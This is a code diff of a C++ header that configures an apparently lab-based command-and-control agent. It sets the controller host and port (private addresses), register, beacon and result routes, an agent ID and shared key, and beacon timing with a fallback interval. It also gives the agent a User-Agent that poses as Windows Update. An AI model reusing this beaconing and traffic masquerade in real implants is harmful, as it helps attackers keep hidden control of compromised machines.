@@ -2,24 +2,47 @@
 
 #include <cstddef>
 
+// --- Controleur ------------------------------------------------------------
+
 #ifndef C2_HOST
-#define C2_HOST L"10.84.107.108"
+#define C2_HOST L"192.168.56.1"
 #endif
 
 #ifndef C2_PORT
-#define C2_PORT 8000
+#define C2_PORT 8080
 #endif
 
-// Path used for every beacon request.
-constexpr wchar_t BeaconPath[] = L"/api/v2/ping";
+// Routes du contrat expose par le controleur.
+constexpr wchar_t RegisterPath[] = L"/register";
+constexpr wchar_t BeaconPath[]   = L"/beacon";
+constexpr wchar_t ResultPath[]   = L"/result";
 
 // User-Agent sent with every request.
 constexpr wchar_t UserAgent[] =
 	L"Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.0";
 
-constexpr char FallbackAgentId[] = "VM-Windows-01";
+// --- Identite --------------------------------------------------------------
 
-// Timeouts
+#ifndef AGENT_ID
+#define AGENT_ID "agent-01"
+#endif
+
+#ifndef AGENT_SHARED_KEY
+#define AGENT_SHARED_KEY "lab-2026"
+#endif
+
+// --- Cadence ---------------------------------------------------------------
+constexpr int BeaconIntervalMs = 0;
+
+// Garde anti-boucle : si le controleur repond vide plus vite que ca, c'est
+// qu'il ne tient pas la requete. On passe alors en mode degrade, avec un
+// intervalle entre deux beacons (equivalent a un poll court).
+
+constexpr int FastReplyThresholdMs     = 200;
+constexpr int FastReplyMaxCount        = 3;
+constexpr int FallbackBeaconIntervalMs = 3000;
+
+// --- Timeouts --------------------------------------------------------------
 
 constexpr int TimeoutResolveMs = 3000;
 constexpr int TimeoutConnectMs = 3000;
